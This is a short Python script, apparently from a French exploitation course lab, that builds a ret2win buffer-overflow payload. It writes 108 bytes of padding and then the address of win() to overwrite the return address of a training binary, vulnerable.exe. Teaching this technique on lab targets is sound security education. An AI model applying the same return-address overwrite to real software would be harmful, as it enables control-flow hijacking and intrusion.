#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Outil du Jour 4 - fabrication de la charge utile ret2win.

Permet de REFABRIQUER la charge utile du Jour 3 (`payload.bin`) demandee par le
TP15 (la rejouer contre `durci.exe`) et le TP18 (la rejouer contre
`vulnerable.exe`). Tout est deja ecrit SAUF deux valeurs a completer (les TODO).
Pas besoin de savoir programmer : il faut retrouver ces deux nombres avec x32dbg
et Ghidra, puis les ecrire ici.

Principe :
    [ remplissage ] + [ adresse de win() ]
    <--- OFFSET ---->   <--- 4 octets ---->
On remplit le tampon jusqu'a l'adresse de retour (OFFSET octets), puis on
ecrit par-dessus l'adresse de win() (32 bits, petit-boutiste).

Usage :
    python payload.py > payload.bin
    puis, cote Windows :   type payload.bin | vulnerable.exe
"""
import struct
import sys

# --- A COMPLETER -----------------------------------------------------------
# TODO(1): nombre d'octets de remplissage avant l'adresse de retour.
#          Indice : utilisez motif.py. "python motif.py gen 200 > motif.bin",
#          envoyez-le a la cible, lisez EIP dans x32dbg, puis
#          "python motif.py find 0x<EIP>" vous rend ce nombre.
OFFSET = 108             # vulnerable.exe (TP18) : confirme (secret + buf
                         # avant l'adresse de retour) et deja donne par
                         # l'enonce / outils/README.md

# TODO(2): adresse de la fonction win() (lue dans Ghidra, format 0x004016xx).
WIN_ADDR = 0x00401648    # win() de vulnerable.exe, confirme en Ghidra
# ---------------------------------------------------------------------------


def main():
    payload = b"A" * OFFSET + struct.pack("<I", WIN_ADDR)
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
